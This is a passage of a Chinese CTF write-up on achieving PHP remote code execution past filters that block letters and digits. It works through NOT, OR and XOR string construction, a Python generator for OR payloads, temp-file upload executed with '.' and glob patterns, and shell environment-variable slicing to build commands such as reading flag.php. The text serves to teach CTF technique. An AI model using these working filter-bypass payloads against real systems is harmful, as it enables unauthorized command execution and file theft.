command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="取反构造"><a href="#取反构造" class="headerlink" title="取反构造"></a>取反构造</h3><p>这个的话其实和异或是一样的，通过位运算取反符号去取得需要的字符</p>
<p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo ~(&#x27;瞰&#x27;&#123;1&#125;);    // a</span><br><span class="line">echo ~(&#x27;和&#x27;&#123;2&#125;);    // s</span><br><span class="line">echo ~(&#x27;和&#x27;&#123;2&#125;);    // s</span><br><span class="line">echo ~(&#x27;的&#x27;&#123;1&#125;);    // e</span><br><span class="line">echo ~(&#x27;半&#x27;&#123;1&#125;);    // r</span><br><span class="line">echo ~(&#x27;始&#x27;&#123;2&#125;);    // t</span><br></pre></td></tr></table></figure>

<p>PHP5下不能直接<code>&quot;瞰&quot;&#123;2&#125;</code>，这是PHP7下的语法</p>
<p>我们举个例子</p>
<p>使用 <code>帅[1]</code> 的结果是 <code>\xb8</code> 经过取反之后得到字母 <code>G</code>。</p>
<p>具体取反过程如下:</p>
<ul>
<li>先将十六进制 <code>b8</code> 转为二进制。</li>
<li>再将 <code>b8</code> 的二进制进行按位取反，0 变成 1,1 变成 0。</li>
<li>最后再将得到的二进制转为十进制与 <code>ASCII</code> 表中进行比对，最终找到字母 <code>G</code>。</li>
</ul>
<p>然后我这里找了一个脚本可以获取取反结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = ~<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90&lt;/br&gt;phpinfo</span></span><br></pre></td></tr></table></figure>

<p>然后我们利用php7的特性传入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308115604303.png" alt="image-20250308115604303"></p>
<h3 id="或构造"><a href="#或构造" class="headerlink" title="或构造"></a>或构造</h3><p>在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。</p>
<p>直接放脚本了，很简单</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">contents = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;[a-z]|[0-9]&#x27;</span><span class="comment">#匹配题目正则</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(i),re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(j),re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= k &lt;= <span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                contents += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(contents)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;请输入想要或运算的字符串:\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> i ==line[<span class="number">0</span>]:</span><br><span class="line">                payload1 = payload1 + line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                payload2 = payload2 + line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    payload = <span class="string">&#x27;(&quot;&#x27;</span>+payload1+<span class="string">&#x27;&quot;|&quot;&#x27;</span>+payload2+<span class="string">&#x27;&quot;)&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span> + payload) </span><br></pre></td></tr></table></figure>

<p>本地测试一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308143753174.png" alt="image-20250308143753174"></p>
<p>然后传入payload</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308143825362.png" alt="image-20250308143825362"></p>
<p>也是可以打通的</p>
<p>以上就是无数字字母的一些基础的姿势，其实还是围绕着利用php的特性去构造字符从而构造函数去进行命令执行的，那我们再深入了解一下</p>
<h2 id="eval中无数字字母RCE-冲破限制"><a href="#eval中无数字字母RCE-冲破限制" class="headerlink" title="eval中无数字字母RCE(冲破限制)"></a>eval中无数字字母RCE(冲破限制)</h2><p>参考的还是p牛的文章，大佬的文章写的深度确实很不错</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p>如果我们的题目代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比之前的无数字字母的webshell，这里明显多了两个限制:</p>
<ol>
<li>对传入参数的长度进行了限制</li>
<li>过滤了_和$</li>
</ol>
<p>其实本质上第二个限制对我们的大部分payload是造不成影响的，但是先别急，我们先看看在取反和异或中p神是怎么做的</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308145102364.png" alt="image-20250308145102364"></p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308145154905.png" alt="image-20250308145154905"></p>
<p>首先我们先要了解一下php7和php5的特性</p>
<h3 id="PHP-5-和-PHP-7-的区别"><a href="#PHP-5-和-PHP-7-的区别" class="headerlink" title="PHP 5 和 PHP 7 的区别"></a>PHP 5 和 PHP 7 的区别</h3><p>1）在 PHP 5 中，<code>assert()</code>是一个函数，我们可以用<code>$_=assert;$_()</code>这样的形式来实现代码的动态执行。但是在 PHP 7 中，<code>assert()</code>变成了一个和<code>eval()</code>一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）</p>
<p>（2）PHP5中，是不支持<code>($a)()</code>这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写<code>(&#39;phpinfo&#39;)();</code></p>
<p>因为我的是php7，这就导致了我们上面的异或，或和取反的方法是可行的，不过p牛是用php5来进行测试的，但是明显在php5下这两个限制条件对上面的payload起到了很大的限制作用</p>
<p>摘录一下p牛的话：</p>
<p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p>
<p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p>
<h3 id="PHP5-shell打破限制"><a href="#PHP5-shell打破限制" class="headerlink" title="PHP5+shell打破限制"></a>PHP5+shell打破限制</h3><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p>
<p>其实这里我第一想法就是在shell下的<code>.</code>去执行脚本文件，刚好和p牛的相似。这得益于之前在ctfshow做的一道题，只不过那道题的wp写的迷迷糊糊，这次恰恰可以完整的学明白这个知识点</p>
<p>两个有趣的Linux shell知识点：</p>
<ol>
<li>shel下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名可以用glob通配符代替</li>
</ol>
<p>先看第一点，<code>.</code> 命令（或者 <code>source</code> 命令）和source一样，就是可以利用当前的shell去执行一个文件中的命令，例如bash，那么.file的话就是利用bash去执行file文件中的命令</p>
<p>注意一个重要的点，在 Linux 和类 Unix 操作系统中，文件和目录有三种权限，分别是读（R）、写（W）、执行（X）。用<code>.</code>去执行文件是不需要文件有X权限的，那么如果我们有一个可控的文件，是不是就可以直接通过<code>.</code>去执行了，接下来就来到了我们第二个问题，在无数字字母的情况下如何得到文件名？</p>
<p>这就涉及到第二点了，如果我们通过post向目标服务器发送一个上传文件的post包，此时php会将我们上传的文件保存在临时文件夹下，Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>），这时候我们就可以利用到Linux下的glob通配符</p>
<table>
<thead>
<tr>
<th>*</th>
<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
</tr>
</tbody></table>
<p>那么我们的文件<code>/tmp/phpXXXXXX</code>就可以表示为<code>/???/?????????</code>或者<code>/*/?????????</code>等方式，我们试着去执行一下</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308152113923.png" alt="image-20250308152113923"></p>
<p>为什么执行不了呢，因为能够匹配上<code>/???/?????????</code>的文件有很多，例如我们ls列出来的文件都是符合条件的。此时系统并不知道应该执行哪个文件，又或者说系统从第一个匹配的文件开始执行的时候就会出现错误，这时候又该如何破局？</p>
<h3 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h3><p>在看完p牛贴的<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">linux文档</a>后才知道，原来上面的[]通配符的姿势有这么多</p>
<table>
<thead>
<tr>
<th>[abcd]</th>
<th>匹配指定字符范围内的任意单个字符</th>
</tr>
</thead>
<tbody><tr>
<td>[a-z]</td>
<td>表示范围a到z，表示范围的意思</td>
</tr>
</tbody></table>
<ul>
<li>我们想要排除字符，就可以使用表达式<code> [!...]</code>或者<code>[^...]</code>，例如<code>[!]a-]</code>意思就是匹配除了<code>]</code>,<code>a</code>,<code>-</code>外的任意单一字符</li>
<li>我们想要匹配字符，就可以使用表达式<code>[abcd]</code>,例如<code>[[?*\]</code>意思是匹 配四个字符<code>[</code>,<code>?</code>,<code>*</code>,<code>\</code>。因为这些都是shell的一部分，将他们括在括号中的时候，括号内的字符只表示他们自己</li>
<li>我们想要匹配特定范围内的字符，就可以用表达式<code>[a-z]</code>，两个字符用<code>-</code>分割表示一个范围，例如[a-Fa-f0-9]意思是匹配<code>ABCDEFabcdef0123456789</code>等字符</li>
</ul>
<p>试一下呗，例如前面的bin目录的文件，我们排除掉他的话</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308154713325.png" alt="image-20250308154713325"></p>
<p>如果我们只匹配b开头的文件目录的话</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308154754491.png" alt="image-20250308154754491"></p>
<p><strong>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。</strong></p>
<p>但是如果我们想要用方括号去匹配的字符是大写字母呢，翻阅ASCII码表就可以看到，大写字母是位于<code>@</code>和<code>[</code>之间的&#x2F;。那么，我们可以利用<code>[@-[]</code>来表示大写字母</p>
<p>那么我们就可以构造poc执行任意命令</p>
<p>在system中可以传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%<span class="number">20</span>/???/????????[@-[]</span><br></pre></td></tr></table></figure>

<p>在eval中可以传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="构造poc执行rce"><a href="#构造poc执行rce" class="headerlink" title="构造poc执行rce"></a>构造poc执行rce</h3><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，所以我们还是得多尝试几次，例如我们拿ctfshow的web56进行讲解</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308155806708.png" alt="image-20250308155806708"></p>
<p>这道题因为过滤了括号，以至于我们的取反异或这些方法都行不通，我们用新的方法试一下</p>
<p>首先我们构造一个post请求包上传一个命令脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://123.56.166.154:10004/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后编辑我们的命令脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>上传文件后抓包传参通过<code>.</code>执行临时文件</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308160609811.png" alt="image-20250308160609811"></p>
<p>成功执行！</p>
<h2 id="eval中无数字字母RCE-扩展"><a href="#eval中无数字字母RCE-扩展" class="headerlink" title="eval中无数字字母RCE(扩展)"></a>eval中无数字字母RCE(扩展)</h2><p>这起源于我在做ctfshow里的web57找到的一个思路，题目提示flag在36.php，同时过滤了点号，执行语句也比较特殊，这里主要是为了扩展一下构造字符的方法</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250308162645101.png" alt="image-20250308162645101"></p>
<p>其实这道题的思路就是利用利用linux的$(())构造出数字</p>
<h4 id="利用linux的-构造数字"><a href="#利用linux的-构造数字" class="headerlink" title="利用linux的$(())构造数字"></a>利用linux的$(())构造数字</h4><p>实现步骤</p>
<p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p>
<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p>
<p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p>
<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_reverse_number = <span class="string">&quot;$((~$((&#123;&#125;))))&quot;</span> <span class="comment"># 取反操作</span></span><br><span class="line">negative_one = <span class="string">&quot;$((~$(())))&quot;</span>        <span class="comment"># -1</span></span><br><span class="line">payload = get_reverse_number.<span class="built_in">format</span>(negative_one*<span class="number">37</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>补充一个姿势，这几天做题碰到了就积累下来了</p>
<h2 id="环境变量绕过"><a href="#环境变量绕过" class="headerlink" title="环境变量绕过"></a>环境变量绕过</h2><p>首先我们要先了解到什么是环境变量</p>
<p>Bash内置变量是Bash shell中预定义的特殊变量。用于存储系统信息、脚本参数、环境状态等。这些变量由 Bash 自动设置和管理，用户可以直接使用它们来获取相关信息或控制脚本行为。而环境变量就是Bash内置变量的一种</p>
<p><strong>脚本参数相关变量</strong></p>
<ul>
<li>**<code>$0</code>**：当前脚本的名称。</li>
<li>**<code>$1</code>, <code>$2</code>, …, <code>$9</code>**：脚本的第 1 到第 9 个参数。(结果为空)</li>
<li>**<code>$#</code>**：传递给脚本的参数个数。(结果为0)</li>
<li>**<code>$@</code>**：所有传递给脚本的参数（每个参数作为独立的字符串）。</li>
<li>**<code>$\*</code>**：所有传递给脚本的参数（所有参数作为一个整体字符串）。</li>
<li>**<code>$?</code>**：上一个命令的退出状态（0 表示成功，非 0 表示失败）。</li>
</ul>
<p><strong>2. 进程相关变量</strong></p>
<ul>
<li>**<code>$$</code>**：当前 shell 进程的 PID（进程 ID）。</li>
<li>**<code>$!</code>**：最后一个后台运行的进程的 PID。</li>
<li>**<code>$BASHPID</code>**：当前 Bash 进程的 PID（与 <code>$$</code> 类似，但在子 shell 中会不同）。</li>
</ul>
<p><strong>3. 环境相关变量</strong></p>
<ul>
<li>**<code>$HOME</code>**：当前用户的主目录路径。</li>
<li>**<code>$PWD</code>**：当前工作目录的路径。</li>
<li>**<code>$OLDPWD</code>**：上一次工作目录的路径。</li>
<li>**<code>$USER</code>**：当前用户名。</li>
<li>**<code>$SHELL</code>**：当前 shell 的路径。</li>
<li>**<code>$PATH</code>**：命令搜索路径（以冒号分隔的目录列表）。</li>
<li>**<code>$LANG</code>**：当前语言环境设置。</li>
</ul>
<p><strong>4. 脚本运行相关变量</strong></p>
<ul>
<li>**<code>$SECONDS</code>**：脚本已经运行的秒数。</li>
<li>**<code>$RANDOM</code>**：返回一个随机整数（范围是 0 到 32767）。</li>
<li>**<code>$LINENO</code>**：当前脚本中的行号。</li>
</ul>
<p><strong>5. IFS（Internal Field Separator）</strong></p>
<ul>
<li>**<code>$IFS</code>**：输入字段分隔符，用于控制 Bash 如何拆分字符串（默认是空格、制表符和换行符）。</li>
</ul>
<p><strong>6. 其他常用变量</strong></p>
<ul>
<li>**<code>$BASH</code>**：当前 Bash 可执行文件的路径。</li>
<li>**<code>$BASH_VERSION</code>**：当前 Bash 的版本号。</li>
<li>**<code>$HOSTNAME</code>**：当前主机名。</li>
<li>**<code>$UID</code>**：当前用户的用户 ID。</li>
</ul>
<p>通过以上变量其实我们就可以知道一些绕过就是跟变量有关的例如空格绕过就是利用了$IFS的作用</p>
<h3 id="PATH环境变量切割构造字符"><a href="#PATH环境变量切割构造字符" class="headerlink" title="$PATH环境变量切割构造字符"></a>$PATH环境变量切割构造字符</h3><p>首先使用echo去输出我们的环境变量，然后从环境变量的内容中找出我们需要的字符去进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot7# echo $&#123;PATH:0:10&#125;</span><br><span class="line">/usr/local</span><br><span class="line">这里可以看到我们是可以通过范围去取用环境变量中的单个字符然后进行拼接的</span><br></pre></td></tr></table></figure>

<h3 id="PWD环境变量切割构造字符"><a href="#PWD环境变量切割构造字符" class="headerlink" title="$PWD环境变量切割构造字符"></a>$PWD环境变量切割构造字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $&#123;PWD:0:3&#125;</span><br><span class="line">/va</span><br><span class="line">也是可以通过切割去获取字符的</span><br></pre></td></tr></table></figure>

<p>但是如果碰到题目过滤了数字，就需要另外构造了，例如linux可以利用<code>~</code>获得变量的最后几位（从最后开始获取），使用取反号时，任何字母等同于数字0。</p>
<p>例如我们为了构造读取文件的命令nl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $&#123;PWD:~A&#125;</span><br><span class="line">l</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# echo $&#123;PATH:~A&#125;</span><br><span class="line">n</span><br></pre></td></tr></table></figure>

<p>这里可以看到<code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;</code>表示的就是<code>PATH</code>的最后一个字母和<code>PWD</code>的最后一个字母，组合起来就是nl。</p>
<p>那我们如果读取flag.php的话就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; flag.php</span><br></pre></td></tr></table></figure>

<p>相当于：<code>nl flag.php</code></p>
<p>这里借师傅的一张图，放一些常用的构造字符的方法</p>
<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317164402702.png" alt="image-20250317164402702"></p>
<p>这里的话可以根据不同的变量进行构造，构造出想要的字符，例如我们希望使用&#x2F;bin&#x2F;cat去读取文件，那么我们可以构造&#x2F;???&#x2F;??t或者&#x2F;???&#x2F;?a?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;</span><br><span class="line">/???/??t</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;?</span><br><span class="line">/???/?a?</span><br></pre></td></tr></table></figure>

<p>又或者我们想要构造&#x2F;bin&#x2F;bash64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125;</span><br><span class="line">RANDOM是一个随机数变量，返回一个随机整数（范围是 0 到 32767）。然后加上#号的话表示的是该变量的值的长度，例如$&#123;#1234&#125;的结果就是4</span><br></pre></td></tr></table></figure>

<p>这里积累了一个奇妙的姿势，就是通过变量返回数字</p>
<p>利用<code>$?</code>，获取上一条命令执行结束后的返回值，<code>0</code>代表成功，<code>非0</code>代表失败。非0返回值的命令如下</p>
